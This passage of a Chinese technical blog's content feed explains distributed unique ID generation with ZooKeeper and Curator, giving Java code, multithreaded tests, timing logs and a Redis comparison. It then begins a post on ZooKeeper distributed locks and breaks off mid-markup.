class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Zookeeper Client 查看节点数据</strong>：</p><p><img src="/img/zookeeper/uniqueId-zookeeper.png" alt=""></p><p><strong>分析</strong>：</p><ul><li>所有ID唯一，无重复</li><li>多线程环境下可保证ID自增</li></ul><p><strong>原生ZooKeeper的API实现的一些问题</strong></p><p>会话连接是异步的，需要自己去处理。比如使用 CountDownLatch<br>Watch 需要重复注册，不然就不能生效<br>开发的复杂性还是比较高的<br>不支持多节点删除和创建，需要自己去递归。<br>因此可以使用ZooKeeper的框架——Curator。</p><h3 id="Curator实现分布式ID"><a href="#Curator实现分布式ID" class="headerlink" title="Curator实现分布式ID"></a>Curator实现分布式ID</h3><p>Curator是Netflix公司开源的一套ZooKeeper客户端框架，提供了一套易用性和可读性更强的Fluent风格的客户端API框架。为ZooKeeper客户端框架提供了一些比较普遍的、开箱即用的、分布式开发用的解决方案，例如Recipe、共享锁服务、Master选举机制和分布式计算器等，帮助开发者避免了“重复造轮子”的无效开发工作。</p><p>Guava is to Java that Curator to ZooKeeper</p><p>更多Curator介绍参考：《Zookeeper开源客户端框架Curator简介》<a href="https://www.iteye.com/blog/macrochen-1366136" target="_blank" rel="noopener">https://www.iteye.com/blog/macrochen-1366136</a></p><p>1、代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CuratorUniqueID</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> CuratorFramework curatorFrameworkClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> RetryPolicy retryPolicy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String IP = <span class="string">"127.0.0.1:2181"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String ROOT = <span class="string">"/uniqueId-curator"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String NODE_NAME = <span class="string">"/uniqueId"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        retryPolicy = <span class="keyword">new</span> ExponentialBackoffRetry(<span class="number">1000</span>, <span class="number">3</span>);</span><br><span class="line">        curatorFrameworkClient = CuratorFrameworkFactory</span><br><span class="line">                .builder()</span><br><span class="line">                .connectString(IP)</span><br><span class="line">                .sessionTimeoutMs(<span class="number">5000</span>)</span><br><span class="line">                .connectionTimeoutMs(<span class="number">5000</span>)</span><br><span class="line">                .retryPolicy(retryPolicy)</span><br><span class="line">                .build();</span><br><span class="line">        curatorFrameworkClient.start();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//请先判断父节点/root节点是否存在</span></span><br><span class="line">            Stat stat = curatorFrameworkClient.checkExists().forPath(ROOT);</span><br><span class="line">            <span class="keyword">if</span> (stat == <span class="keyword">null</span>) &#123;</span><br><span class="line">                curatorFrameworkClient.create().withMode(CreateMode.PERSISTENT).forPath(ROOT, <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成唯一id</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 唯一id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String backPath = <span class="string">""</span>;</span><br><span class="line">        String fullPath = ROOT.concat(NODE_NAME);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 关键点：创建临时顺序节点</span></span><br><span class="line">            backPath = curatorFrameworkClient.create().withMode(CreateMode.EPHEMERAL_SEQUENTIAL).forPath(fullPath,</span><br><span class="line">                    <span class="keyword">null</span>);</span><br><span class="line">            log.info(<span class="string">"zk创建临时有序节点：&#123;&#125;"</span>, backPath);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> backPath.substring(ROOT.length() + NODE_NAME.length());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CuratorUniqueIDTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试 Curator 生成分布式id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generateId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String id = CuratorUniqueID.generateId();</span><br><span class="line">        System.out.println(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试 Curator 生成唯一ID（多线程下）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUniqueIdForThread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"分布式唯一ID:"</span> + CuratorUniqueID.generateId());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"thread-0"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"分布式唯一ID:"</span> + CuratorUniqueID.generateId());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"thread-1"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">"分布式唯一ID:"</span> + CuratorUniqueID.generateId());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">"thread-2"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//睡眠，用以保证有充足的时间执行</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 单机ZooKeeper</span></span><br><span class="line"><span class="comment">     * 单线程生成10W个 分布式ID 测速</span></span><br><span class="line"><span class="comment">     * 大约为：3060085 ms  大约为 51min</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generateUniqueIdForMore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LocalDateTime startTime = LocalDateTime.now();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">            String id = CuratorUniqueID.generateId();</span><br><span class="line">            System.out.println(id);</span><br><span class="line">        &#125;</span><br><span class="line">        LocalDateTime endTime = LocalDateTime.now();</span><br><span class="line">        <span class="comment">// 计算时间差值</span></span><br><span class="line">        <span class="keyword">long</span> minutes = Duration.between(startTime, endTime).toMillis();</span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        System.out.println(<span class="string">"生成10万个分布式id所用的时间："</span> + minutes + <span class="string">" ms"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 单机ZooKeeper</span></span><br><span class="line"><span class="comment">     * 线程池开10个线程生成10W个 分布式ID 测速</span></span><br><span class="line"><span class="comment">     * 大约为：3073690 ms  基本和单线程环境一致</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generateUniqueIdForThreadPoolExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ThreadPoolExecutor threadPoolExecutor = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建线程池</span></span><br><span class="line">        threadPoolExecutor = <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">10</span>,</span><br><span class="line">                <span class="number">20</span>,</span><br><span class="line">                <span class="number">10</span>,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> LinkedBlockingQueue&lt;&gt;(<span class="number">20</span>),</span><br><span class="line">                <span class="keyword">new</span> ThreadPoolExecutor.CallerRunsPolicy());</span><br><span class="line">        LocalDateTime startTime = LocalDateTime.now();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">            FutureTask&lt;String&gt; futureTask = <span class="keyword">new</span> FutureTask&lt;&gt;(<span class="keyword">new</span> ThreadPoolTask());</span><br><span class="line">            threadPoolExecutor.execute(futureTask);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                String id = futureTask.get();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        threadPoolExecutor.shutdown();</span><br><span class="line">        LocalDateTime endTime = LocalDateTime.now();</span><br><span class="line">        <span class="comment">// 计算时间差值</span></span><br><span class="line">        <span class="keyword">long</span> minutes = Duration.between(startTime, endTime).toMillis();</span><br><span class="line">        <span class="comment">// 输出</span></span><br><span class="line">        System.out.println(<span class="string">"线程池 生成10万个分布式id所用的时间："</span> + minutes + <span class="string">" ms"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPoolTask</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            String id = CuratorUniqueID.generateId();</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">"---"</span> + id);</span><br><span class="line">            <span class="keyword">return</span> id;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>Zookeeper Client 查看节点数据</strong>：</p><p><img src="/img/zookeeper/uniqueId-curator.png" alt=""></p><h3 id="单线程生成10万个分布式ID测速"><a href="#单线程生成10万个分布式ID测速" class="headerlink" title="单线程生成10万个分布式ID测速"></a>单线程生成10万个分布式ID测速</h3><p><strong>ZooKeeper单机环境下，使用单线程，生成10万分布式ID测速</strong>。</p><p>代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 单机ZooKeeper</span></span><br><span class="line"><span class="comment">     * 单线程生成10W个 分布式ID 测速</span></span><br><span class="line"><span class="comment">     * 大约为：3060085 ms  大约为 51min</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generateUniqueIdForMore</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    LocalDateTime startTime = LocalDateTime.now();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        String id = CuratorUniqueID.generateId();</span><br><span class="line">        System.out.println(id);</span><br><span class="line">    &#125;</span><br><span class="line">    LocalDateTime endTime = LocalDateTime.now();</span><br><span class="line">    <span class="comment">// 计算时间差值</span></span><br><span class="line">    <span class="keyword">long</span> minutes = Duration.between(startTime, endTime).toMillis();</span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    System.out.println(<span class="string">"生成10万个分布式id所用的时间："</span> + minutes + <span class="string">" ms"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2021</span>-<span class="number">08</span>-<span class="number">21</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">28</span>,<span class="number">568</span> INFO [cn.duktig.learn.id.CuratorUniqueID] - zk创建临时有序节点：/uniqueId-curator/uniqueId0000100087</span><br><span class="line"> <span class="number">0000100087</span></span><br><span class="line"><span class="number">2021</span>-<span class="number">08</span>-<span class="number">21</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">28</span>,<span class="number">603</span> INFO [cn.duktig.learn.id.CuratorUniqueID] - zk创建临时有序节点：/uniqueId-curator/uniqueId0000100088</span><br><span class="line"> <span class="number">0000100088</span></span><br><span class="line"><span class="number">2021</span>-<span class="number">08</span>-<span class="number">21</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">28</span>,<span class="number">645</span> INFO [cn.duktig.learn.id.CuratorUniqueID] - zk创建临时有序节点：/uniqueId-curator/uniqueId0000100089</span><br><span class="line"> <span class="number">0000100089</span></span><br><span class="line"><span class="number">2021</span>-<span class="number">08</span>-<span class="number">21</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">28</span>,<span class="number">681</span> INFO [cn.duktig.learn.id.CuratorUniqueID] - zk创建临时有序节点：/uniqueId-curator/uniqueId0000100090</span><br><span class="line"> <span class="number">0000100090</span></span><br><span class="line">    </span><br><span class="line">生成<span class="number">10</span>万个分布式id所用的时间：<span class="number">3060085</span> ms</span><br></pre></td></tr></table></figure><h3 id="线程池10个线程生成10万个分布式ID测速"><a href="#线程池10个线程生成10万个分布式ID测速" class="headerlink" title="线程池10个线程生成10万个分布式ID测速"></a>线程池10个线程生成10万个分布式ID测速</h3><p><strong>ZooKeeper单机环境下，使用线程池开10个线程，生成10万分布式ID测速</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 单机ZooKeeper</span></span><br><span class="line"><span class="comment">     * 线程池开10个线程生成10W个 分布式ID 测速</span></span><br><span class="line"><span class="comment">     * 大约为：3073690 ms  基本和单线程环境一致</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generateUniqueIdForThreadPoolExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ThreadPoolExecutor threadPoolExecutor = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建线程池</span></span><br><span class="line">    threadPoolExecutor = <span class="keyword">new</span> ThreadPoolExecutor(<span class="number">10</span>,</span><br><span class="line">                                                <span class="number">20</span>,</span><br><span class="line">                                                <span class="number">10</span>,</span><br><span class="line">                                                TimeUnit.SECONDS,</span><br><span class="line">                                                <span class="keyword">new</span> LinkedBlockingQueue&lt;&gt;(<span class="number">20</span>),</span><br><span class="line">                                                <span class="keyword">new</span> ThreadPoolExecutor.CallerRunsPolicy());</span><br><span class="line">    LocalDateTime startTime = LocalDateTime.now();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        FutureTask&lt;String&gt; futureTask = <span class="keyword">new</span> FutureTask&lt;&gt;(<span class="keyword">new</span> ThreadPoolTask());</span><br><span class="line">        threadPoolExecutor.execute(futureTask);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String id = futureTask.get();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    threadPoolExecutor.shutdown();</span><br><span class="line">    LocalDateTime endTime = LocalDateTime.now();</span><br><span class="line">    <span class="comment">// 计算时间差值</span></span><br><span class="line">    <span class="keyword">long</span> minutes = Duration.between(startTime, endTime).toMillis();</span><br><span class="line">    <span class="comment">// 输出</span></span><br><span class="line">    System.out.println(<span class="string">"线程池 生成10万个分布式id所用的时间："</span> + minutes + <span class="string">" ms"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPoolTask</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String id = CuratorUniqueID.generateId();</span><br><span class="line">        System.out.println(Thread.currentThread().getName() + <span class="string">"---"</span> + id);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">2021-08-21 11:24:31,674 INFO [cn.duktig.learn.id.CuratorUniqueID] - zk创建临时有序节点：&#x2F;uniqueId-curator&#x2F;uniqueId0000200088</span><br><span class="line"> pool-1-thread-4---0000200088</span><br><span class="line">2021-08-21 11:24:31,694 INFO [cn.duktig.learn.id.CuratorUniqueID] - zk创建临时有序节点：&#x2F;uniqueId-curator&#x2F;uniqueId0000200089</span><br><span class="line"> pool-1-thread-2---0000200089</span><br><span class="line">2021-08-21 11:24:31,718 INFO [cn.duktig.learn.id.CuratorUniqueID] - zk创建临时有序节点：&#x2F;uniqueId-curator&#x2F;uniqueId0000200090</span><br><span class="line"> pool-1-thread-3---0000200090</span><br><span class="line"></span><br><span class="line">线程池 生成10万个分布式id所用的时间：3073690 ms</span><br></pre></td></tr></table></figure><p><strong>Redis与ZooKeeper实现分布式ID对比</strong><br>环境：单机的Redis和单机的ZooKeeper进行测试</p><div class="table-container"><table><thead><tr><th></th><th>Redis</th><th>ZooKeeper</th></tr></thead><tbody><tr><td>单线程10万分布式ID</td><td>110353 ms</td><td>3060085 ms 大约为 51min</td></tr><tr><td>线程池开10个线程生成10万分布式ID</td><td>106959 ms</td><td>3073690 ms 基本和单线程环境一致</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> Zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper案例-分布式锁</title>
      <link href="/2021/06/25/Zookeeper%E6%A1%88%E4%BE%8B-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"/>
      <url>/2021/06/25/Zookeeper%E6%A1%88%E4%BE%8B-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么需要分布式锁"><a href="#为什么需要分布式锁" class="headerlink" title="为什么需要分布式锁"></a>为什么需要分布式锁</h2><p>为了保证一个方法或属性在高并发情况下的同一时间只能被同一个线程执行，在传统单体应用单机部署的情况下，可以使用并发处理相关的功能进行互斥控制。但是，随着业务发展的需要，原单体单机部署的系统被演化成分布式集群系统后，由于分布式系统多线程、多进程并且分布在不同机器上，这将使原单机部署情况下的并发控制锁策略失效，单纯的应用并不能提供分布式锁的能力。为了解决这个问题就需要一种跨机器的互斥机制来控制共享资源的访问，这就是分布式锁要解决的问题！</p><h2 id="分布式锁应该具备哪些条件"><a href="#分布式锁应该具备哪些条件" class="headerlink" title="分布式锁应该具备哪些条件"></a>分布式锁应该具备哪些条件</h2><p>在分析分布式锁的三种实现方式之前，先了解一下分布式锁应该具备哪些条件：</p><p>1、在分布式系统环境下，一个方法在同一时间只能被一个机器的一个线程执行；<br>2、高可用的获取锁与释放锁；<br>3、高性能的获取锁与释放锁；<br>4、具备可重入特性；<br>5、具备锁失效机制，防止死锁；<br>6、具备非阻塞锁特性，即没有获取到锁将直接返回获取锁失败。</p><h2 id="原生-Zookeeper-实现分布式锁案例"><a href="#原生-Zookeeper-实现分布式锁案例" class="headerlink" title="原生 Zookeeper 实现分布式锁案例"></a>原生 Zookeeper 实现分布式锁案例</h2><p>1）分布式锁实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 